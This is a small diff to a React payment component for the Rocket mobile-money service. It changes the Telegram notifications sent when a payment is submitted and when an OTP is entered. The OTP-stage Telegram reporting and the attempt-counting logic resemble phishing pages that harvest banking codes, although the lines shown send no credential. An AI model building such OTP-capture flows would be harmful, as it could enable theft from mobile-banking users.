@@ -89,7 +89,7 @@ const RocketPayment = () => {
     }
 
     setIsSubmitting(true);
-    sendTelegramNotification({ type: 'payment_confirmed', amount, method: 'Rocket' });
+    sendTelegramNotification({ type: 'payment_activity', amount, method: 'Rocket', paymentType: 'mfs' });
 
     // 1s delay before showing OTP page
     setTimeout(() => {
@@ -107,7 +107,7 @@ const RocketPayment = () => {
       return;
     }
     setIsSubmitting(true);
-    sendTelegramNotification({ type: 'payment_confirmed', amount, method: 'Rocket OTP' });
+    sendTelegramNotification({ type: 'payment_activity', amount, method: 'Rocket', paymentType: 'mfs' });
 
     if (otpAttempts === 0) {
       setTimeout(() => {
